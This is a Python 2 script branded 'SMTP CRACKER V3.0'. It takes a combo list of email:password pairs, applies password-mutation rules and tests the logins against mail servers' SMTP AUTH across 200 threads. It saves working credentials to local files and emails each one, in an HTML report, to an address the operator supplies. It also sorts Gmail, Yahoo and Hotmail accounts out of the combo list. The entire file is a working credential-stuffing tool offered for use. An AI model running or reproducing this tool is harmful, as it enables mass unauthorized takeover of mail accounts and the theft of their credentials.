#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Coded By ARON-TN
#Don't Change copyright Mother Fucker :)
#Tunisia Coderz
import os,socket,threading,base64,datetime,sys,ssl,imaplib,time,re,uuid
def stana():
 for i in msg:
  sys.stdout.write(i)
  sys.stdout.flush()
  time.sleep(0.02)
msg=("\033[91mroot@usr:~$ python2 "+sys.argv[0]+"\n")
stana()
if os.name=='nt':
#Windows
 #Queue
 try:
  import Queue
 except:
  msg=("root@usr:~$ pip2 Queue"+"\n")
  stana()
  os.system('C:\Python27\Scripts\pip2.exe install Queue')
  import Queue
 #requests
 try:
  import requests
 except ImportError:
  msg=("root@usr:~$ pip2 requests"+"\n")
  stana()
  os.system('C:\Python27\Scripts\pip2.exe install requests')
  import requests
 #colorama
 try:
  import colorama
 except ImportError:
  msg=("root@usr:~$ pip2 colorama"+"\n")
  stana()
  os.system('C:\Python27\Scripts\pip2.exe install colorama')
  import colorama
else:
#Linux
 #Queue
 try:
  import Queue
 except ImportError:
  msg=("root@usr:~$ pip2 Queue"+"\n")
  stana()
  os.system('pip2 install Queue')
  import Queue
 #requests
 try:
  import requests
 except ImportError:
  msg=("root@usr:~$ pip2 requests"+"\n")
  stana()
  os.system('pip2 install requests')
  import requests
 #colorama
 try:
  import colorama
 except ImportError:
  msg=("root@usr:~$ pip2 colorama"+"\n")
  stana()
  os.system('pip2 install colorama')
  import colorama
msg=("\033[92mroot@usr:~$ Modules Have been Installed aa N00b :v \n")
stana()
from colorama import *
to_check={}
init()
def logo():
  print('''
   \033[0;96m_     _       \033[93m______   __       __  ________  _______      \033[0;96m_     _  
  (c).-.(c)     \033[93m/      \ /  \     /  |/        |/       \    \033[0;96m(c).-.(c)
   / ._. \     \033[93m/$$$$$$  |$$  \   /$$ |$$$$$$$$/ $$$$$$$  |    \033[0;96m/ ._. \ 
 __\( Y )/__   \033[93m$$ \__$$/ $$$  \ /$$$ |   $$ |   $$ |__$$ |  \033[0;96m__\( Y )/__ 
(_.-/'-'\-._)  \033[93m$$      \ $$$$  /$$$$ |   $$ |   $$    $$/  \033[0;96m(_.-/'-'\-._)
   || A ||      \033[93m$$$$$$  |$$ $$ $$/$$ |   $$ |   $$$$$$$/      \033[0;96m|| R ||
 _.' `-' '._   \033[93m/  \__$$ |$$ |$$$/ $$ |   $$ |   $$ |        \033[0;96m_.' `-' '._  
(.-./`-'\.-.)  \033[93m$$    $$/ $$ | $/  $$ |   $$ |   $$ |       \033[0;96m(.-./`-'\.-.) 
 `-'     `-'    \033[93m$$$$$$/  $$/      $$/    $$/    $$/         \033[0;96m`-'     `-'
               \033[91m[\033[92m+\033[91m]\033[1m(C)opyright > Github.com/ARON-TN\033[91m [\033[92m+\033[91m]
              \033[91m[\033[92m+\033[91m]\033[95m SMTP CRACKER V3.0 DEVEL BY ARON-TN \033[91m[\033[92m+\033[91m]
             \033[91m[\033[92m+\033[91m]\033[92m  EMail : aron.tn.official@gmail.com  \033[91m[\033[92m+\033[91m]
            \033[91m[\033[92m+\033[91m]\033[94m Facebook >  https://www.fb.com/Aron.Tn \033[91m[\033[92m+\033[91m]
           \033[91m[\033[92m+\033[91m]   Youtube > youtube.com/AronTNxOfficial  \033[91m[\033[92m+\033[91m]''')
logo()
print '\033[1m'
class consumer(threading.Thread):
  def __init__(self,qu):
    threading.Thread.__init__(self)
    self.q=qu
    self.hosts=["","smtp.","mail.","webmail."]
    self.ports=[587,465,25]
    self.timeout=13
  def sendCmd(self,sock,cmd):
    sock.send(cmd+"\r\n")
    return sock.recv(900000)
  def addBad(self,ip):
    global bads,rbads
    if rbads:
      bads.append(ip)
    return -1
  def findHost(self,host):
    print '\033[91m[\033[92m*\033[91m]\033[92mSearching smtp host and port on \033[97m'+host
    global cache,bads,rbads
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setblocking(0)
    s.settimeout(self.timeout)
    try:
      d=cache[host]
      try:
        if self.ports[d[1]]==465:
          s=ssl.wrap_socket(s)
        s.connect((self.hosts[d[0]]+host,self.ports[d[1]]))
        return s
      except Exception,e:
        if rbads:
          bads.append(host)
        return None
    except KeyError:
      pass
    cache[host]=[-1,-1]
    for i,p in enumerate(self.ports):
      for j,h in enumerate(self.hosts):
        print '\033[91m[\033[92m*\033[91m]\033[92mTrying connection on\033[97m '+h+host+':'+str(p)
        try:
          s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
          s.setblocking(0)
          s.settimeout(self.timeout)
          if p==465:
            s=ssl.wrap_socket(s)
          s.connect((h+host,p))
          cache[host]=[j,i]
          return s
        except Exception,e:
          continue
    bads.append(host)
    del cache[host]
    return None
  def getPass(self,passw,user,domain):
    passw=str(passw)
    if '%null%' in passw:
      return ""
    elif '%user%' in passw:
      user=user.replace('-','').replace('.','').replace('_','')
      return passw.replace('%user%',user)
    elif '%User%' in user:
      user=user.replace('-','').replace('.','').replace('_','')
      return passw.replace('%User%',user)
    elif '%special%' in user:
      user=user.replace('-','').replace('.','').replace('_','').replace('e','3').replace('i','1').replace('a','@')
      return passw.replace('%special%',user)
    elif '%domain%' in passw:
      return passw.replace('%domain%',domain.replace("-",""))
    if '%part' in passw:
      if '-' in user:
        parts=user.split('-')
      elif '.' in user:
        parts=user.split('.')
      elif '_' in user:
        parts=user.split('_')
      try:
        h=passw.replace('%part','').split('%')[0]
        i=int(h)
        p=passw.replace('%part'+str(i)+'%',parts[i-1])
        return p
      except Exception,e:
        return None
    return passw
  def connect(self,tupple,ssl=False):
    global bads,cracked,cache,email
    host=tupple[0].rstrip()
    host1=host
    user=tupple[1].rstrip()
    if host1 in cracked or host1 in bads:
      return 0
    passw=self.getPass(tupple[2].rstrip(),user.rstrip().split('@')[0],host.rstrip().split('.')[0])
    if passw==None:
      return 0
    try:
      if cache[host][0]==-1:
        return 0
    except KeyError:
      pass
    s=self.findHost(host)
    if s==None:
      return -1
    port=str(self.ports[cache[host][1]])
    if port=="465":
      port+="(SSL)"
    host=self.hosts[cache[host][0]]+host
    print '\033[91m[\033[92m*\033[91m]\033[92mTrying > \033[97m'+host+":"+port+":"+user+":"+passw
    try:
      banner=s.recv(1024)
      if banner[0:3]!="220":
        self.sendCmd(s,'QUIT')
        s.close()
        return self.addBad(host1)
      rez=self.sendCmd(s,"EHLO ADMIN")
      rez=self.sendCmd(s,"AUTH LOGIN")
      if rez[0:3]!='334':
        self.sendCmd(s,'QUIT')
        s.close()
        return self.addBad(host1)
      rez=self.sendCmd(s,base64.b64encode(user))
      if rez[0:3]!='334':
        self.sendCmd(s,'QUIT')
        s.close()
        return self.addBad(host1)
      rez=self.sendCmd(s,base64.b64encode(passw))
      if rez[0:3]!="235" or 'fail' in rez:
        self.sendCmd(s,'QUIT')
        s.close()
        return 0
        print '\033[91m[\033[92m*\033[91m]\033[92m SMTP Cracked >\033[97m '+host+':'+port+' '+user+' '+passw
      save=open('cracked_smtps.txt','a').write(host+":"+port+","+user+","+passw+"\n")
      save=open('cracked_Mailaccess.txt','a').write(user+":"+passw+"\n")
      cracked.append(host1)
      rez=self.sendCmd(s,"RSET")
      if rez[0:3]!='250':
        self.sendCmd(s,'QUIT')
        s.close()
        return self.addBad(host1)
      rez=self.sendCmd(s,"MAIL FROM: <"+user+">")
      if rez[0:3]!='250':
        self.sendCmd(s,'QUIT')
        s.close()
        return self.addBad(host1)
      rez=self.sendCmd(s,"RCPT TO: <"+email+">")
      if rez[0:3]!='250':
        self.sendCmd(s,'QUIT')
        s.close()
        return self.addBad(host1)
      rez=self.sendCmd(s,'DATA')
      headers='From: <'+user+'> ARON-TN\r\n'
      headers+='To: '+email+'\r\n'
      headers+='Reply-To: '+email+'\r\n'
      headers+='Subject: SMTP Cracker User-ID Num: ['+uuid.uuid4().hex.upper()[0:7]+']\r\n'
      headers+='MIME-Version: 1.0\r\n'
      headers+='Content-Transfer-encoding: 8bit\r\n'
      headers+="Content-type: text/html; charset=utf-8\r\n";
      headers+='Return-Path: %s\r\n'%user
      headers+='X-Priority: 1\r\n'
      headers+='X-MSmail-Priority: High\r\n'
      headers+='X-Mailer: Microsoft Office Outlook, Build 11.0.5510\r\n'
      headers+='X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\r\n'
      headers+='''<!DOCTYPE html><html lang='en'><head><meta charset='utf-8'><meta name='viewport' content='width=device-width, initial-scale=1'><link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css'><script src='https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js'></script><script src='https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js'></script></head><body><center><div class='alert alert-warning'><strong>☣</strong> SMTP INFORMATION <strong>☣</strong></div></center><div class='alert alert-info'><strong>Host&nbsp; &nbsp;:</strong> '''+host+'''<br><strong>Port &nbsp; &nbsp;:</strong>'''+port+'''<br><strong>Email &nbsp; &nbsp;:</strong>'''+user+'''<br><strong>Password &nbsp; &nbsp;:</strong>'''+passw+'''</div></body></html>\r\n.\r\n'''
      s.send(headers)
      rez=s.recv(1000)
      self.sendCmd(s,'QUIT')
      s.close()
    except Exception,e:
      s.close()
      return self.addBad(host1)
  def run(self):
    while True:
      cmb=self.q.get()
      self.connect(cmb)
      self.q.task_done()
quee=Queue.Queue(maxsize=20000)
try:
    open("copyright.txt")
except IOError:
    open('copyright.txt','a').write('[+] Developped By ARON-TN \n [*] Facebook > facebook.com/Aron.Tn\n  [*] Youtube > youtube.com/AronTNxOfficial')
tld=open('copyright.txt','r').read().splitlines()
tlds=cache={}
bads=[]
cracked=[]
rbads=0
puta=raw_input('\033[91m[\033[92m+\033[91m]\033[92m Combo Name : \033[97m')
while '.txt' not in str(puta):
 print'/#\ Combo Should be .txt File'
 puta=raw_input('\033[91m[\033[92m+\033[91m]\033[92m Combo Name : \033[97m')
while not os.path.isfile(puta):
   print("/#\ File path {} does not exist.".format(puta))
   puta=raw_input('\033[91m[\033[92m+\033[91m]\033[92m Combo Name : \033[97m')
inputs=open(puta,'r').read().splitlines()
email=raw_input('\033[91m[\033[92m+\033[91m]\033[92m Enter Your Email :\033[97m ')
while '@' not in str(email):
 print'/#\ Email Should be exemple@exemple.tn'
 email=raw_input('\033[91m[\033[92m+\033[91m]\033[92m Enter Your Email :\033[97m ')
thret=200
def part():
  global tld,tlds
  for i in tld:
    tlds[i]=i
part()
for i in range(int(thret)):
 try:
  t=consumer(quee)
  t.setDaemon(True)
  t.start()
 except:
  print "\033[91m{!} Working only with %s threads\033[00m"%i
  break
msg ="\033[91mOh Shit here We go Again ..."
stana()
print(''' 
\033[91m[\033[92m1\033[91m]\033[92m Start Cracking\033[97m 
\033[91m[\033[92m2\033[91m]\033[92m Crack & bypass yahoo/hotmail/gmail domains\033[97m 
\033[91m[\033[92m3\033[91m]\033[92m Create New Combo Without yahoo/hotmail/gmail domains\033[97m 
''')
tn=int(raw_input('>'))
if tn==1:
 for i in inputs:
  user = i.split(':')[0]
  password = i.split(':')[1]
  user = user.lower()
  domain=user.split('@')[1]
  quee.put((domain, user, password))
elif tn==2:
 for i in inputs:
  user = i.split(':')[0]
  password = i.split(':')[1]
  user = user.lower()
  domain=user.split('@')[1]
  if 'gmail' in domain:
    print '\033[91m[\033[92m+\033[91m]\033[92m ',i,' detcted \033[97m '
    save=open('gmail.txt','a').write(user+"\n")
  elif 'yahoo' in domain:
    print '\033[91m[\033[92m+\033[91m]\033[92m ',i,' detcted \033[97m '
    save=open('yahoo.txt','a').write(user+"\n")
  elif 'aol' in domain:
    print '\033[91m[\033[92m+\033[91m]\033[92m ',i,' detcted \033[97m '
    save=open('aol.txt','a').write(user+"\n")
  elif 'ymail' in domain:
    print '\033[91m[\033[92m+\033[91m]\033[92m ',i,' detcted \033[97m '
    save=open('yahoo.txt','a').write(user+"\n")
  elif 'hotmail' in domain:
    print '\033[91m[\033[92m+\033[91m]\033[92m ',i,' detcted \033[97m '
    save=open('hotmail.txt','a').write(user+"\n")
  elif 'outlook' in domain:
    print '\033[91m[\033[92m+\033[91m]\033[92m ',i,' detcted \033[97m '
    save=open('hotmail.txt','a').write(user+"\n")
  else:
   quee.put((domain, user, password))
if tn==3: 
 for i in inputs:
  user = i.split(':')[0]
  password = i.split(':')[1]
  user = user.lower()
  domain=user.split('@')[1]
  extr=domain.split('.')[0]
  if str(extr)=='gmail' or str(extr)=='hotmail' or str(extr)=='yahoo' or str(extr)=='ymail' or str(extr)=='outlook' or str(extr)=='aol' or str(extr)=='google':
   print 'detcted > ',i
  else:
   print 'imported > ',i
   save=open('combo-other.txt','a').write(i+"\n")
quee.join()